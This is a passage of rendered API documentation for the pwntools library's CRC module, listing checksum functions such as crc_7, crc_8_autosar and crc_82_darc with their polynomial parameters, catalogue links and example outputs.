<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x3</li>
<li>width   = 6</li>
<li>init    = 0x0</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-6-itu">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-6-itu</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_6_itu</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">6</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_7">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_7</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_7" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_7 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x9</li>
<li>width   = 7</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.7">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.7</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_7</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">117</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_7_rohc">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_7_rohc</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_7_rohc" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_7_rohc checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x4f</li>
<li>width   = 7</li>
<li>init    = 0x7f</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-7-rohc">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-7-rohc</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_7_rohc</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">83</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_7_umts">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_7_umts</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_7_umts" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_7_umts checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x45</li>
<li>width   = 7</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-7-umts">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-7-umts</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_7_umts</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">97</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_8">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_8</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_8" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_8 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x7</li>
<li>width   = 8</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.8">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.8</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_8</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">244</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_82_darc">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_82_darc</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_82_darc" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_82_darc checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x308c0111011401440411</li>
<li>width   = 82</li>
<li>init    = 0x0</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.82">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat-bits.82</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_82_darc</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">749237524598872659187218</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_8_autosar">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_8_autosar</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_8_autosar" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_8_autosar checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x2f</li>
<li>width   = 8</li>
<li>init    = 0xff</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0xff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-autosar">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-autosar</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_8_autosar</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">223</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_8_cdma2000">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_8_cdma2000</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_8_cdma2000" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_8_cdma2000 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x9b</li>
<li>width   = 8</li>
<li>init    = 0xff</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-cdma2000">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-cdma2000</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_8_cdma2000</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">218</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_8_darc">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_8_darc</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_8_darc" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_8_darc checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x39</li>
<li>width   = 8</li>
<li>init    = 0x0</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-darc">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-darc</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_8_darc</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">21</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_8_dvb_s2">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_8_dvb_s2</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_8_dvb_s2" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_8_dvb_s2 checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0xd5</li>
<li>width   = 8</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-dvb-s2">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-dvb-s2</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_8_dvb_s2</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">188</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_8_ebu">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_8_ebu</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_8_ebu" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_8_ebu checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1d</li>
<li>width   = 8</li>
<li>init    = 0xff</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-ebu">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-ebu</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_8_ebu</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">151</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_8_gsm_a">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_8_gsm_a</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_8_gsm_a" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_8_gsm_a checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1d</li>
<li>width   = 8</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-gsm-a">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-gsm-a</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_8_gsm_a</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">55</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_8_gsm_b">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_8_gsm_b</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_8_gsm_b" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_8_gsm_b checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x49</li>
<li>width   = 8</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0xff</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-gsm-b">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-gsm-b</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_8_gsm_b</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">148</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_8_i_code">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_8_i_code</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_8_i_code" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_8_i_code checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x1d</li>
<li>width   = 8</li>
<li>init    = 0xfd</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-i-code">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-i-code</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_8_i_code</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">126</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_8_itu">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_8_itu</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_8_itu" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_8_itu checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x7</li>
<li>width   = 8</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x55</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-itu">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-itu</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_8_itu</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">161</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_8_lte">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_8_lte</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_8_lte" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_8_lte checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x9b</li>
<li>width   = 8</li>
<li>init    = 0x0</li>
<li>refin   = False</li>
<li>refout  = False</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-lte">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-lte</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">crc_8_lte</span><span class="p">(</span><span class="s1">&#39;123456789&#39;</span><span class="p">)</span>
<span class="go">234</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.crc.crc_8_maxim">
<code class="descclassname">pwnlib.util.crc.</code><code class="descname">crc_8_maxim</code><span class="sig-paren">(</span><em>data</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/crc.py#L301-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.crc.crc_8_maxim" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the crc_8_maxim checksum.</p>
<p>This is simply the <a class="reference internal" href="#pwnlib.util.crc.generic_crc" title="pwnlib.util.crc.generic_crc"><code class="xref py py-func docutils literal"><span class="pre">generic_crc()</span></code></a> with these frozen arguments:</p>
<ul class="simple">
<li>polynom = 0x31</li>
<li>width   = 8</li>
<li>init    = 0x0</li>
<li>refin   = True</li>
<li>refout  = True</li>
<li>xorout  = 0x0</li>
</ul>
<p>See also: <a class="reference external" href="http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-maxim">http://reveng.sourceforge.net/crc-catalogue/all.htm#crc.cat.crc-8-maxim</a></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The data to checksum.</td>
</tr>
